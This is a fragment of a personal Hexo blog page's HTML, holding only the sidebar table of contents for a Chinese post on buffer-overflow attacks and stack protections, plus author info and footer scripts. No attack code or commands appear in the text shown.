href="#%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%9A%84%E6%94%BB%E5%87%BB%E7%9A%84%E7%AE%80%E8%A6%81%E5%8E%9F%E7%90%86%EF%BC%88%E4%BB%A5%E4%B8%8A%E5%9B%BE%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">内存溢出的攻击的简要原理（以上图为例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%B0%E4%BB%A3%E5%86%85%E5%AD%98%E5%A0%86%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%87%BA%E7%8E%B0"><span class="nav-number"></span> <span class="nav-text">现代内存堆栈保护技术出现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B"><span class="nav-number"></span> <span class="nav-text">内存溢出攻击实例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%87%86%E5%A4%87%E4%B8%80%E4%BB%BDshellcode%EF%BC%8C%E5%B0%B1%E6%98%AF%E4%B8%8A%E9%9D%A2%E6%9B%BF%E6%8D%A2eip%E5%90%8E%EF%BC%8C%E4%BD%A0%E6%83%B3%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BB%BD%E4%BB%A3%E7%A0%81%E3%80%82%E6%88%91%E8%BF%99%E9%87%8C%E9%80%89%E6%8B%A9%EF%BC%8C%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshell%E3%80%82"><span class="nav-number"></span> <span class="nav-text">1 准备一份shellcode，就是上面替换eip后，你想要执行的一份代码。我这里选择，生成一个shell。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%AE%9E%E9%99%85%E5%AE%9E%E4%BE%8B%E6%94%BB%E5%87%BB"><span class="nav-number"></span> <span class="nav-text">2 实际实例攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A5%E4%B8%8A%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="nav-number"></span> <span class="nav-text">以上实例分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E6%96%87%E4%B8%BB%E8%A6%81%E6%98%AF%E4%B8%BA%E4%BA%86%E5%AD%A6%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E7%94%A8%E4%BA%8E%E9%9D%9E%E6%B3%95%E7%94%A8%E9%80%94%E3%80%82"><span class="nav-number"></span> <span class="nav-text">本文主要是为了学习计算机中程序执行的原理，请不要用于非法用途。</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number"></span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number"></span> <span class="nav-text">参考文献</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sky"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Sky</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">124</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sky</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">598k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">9:03</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
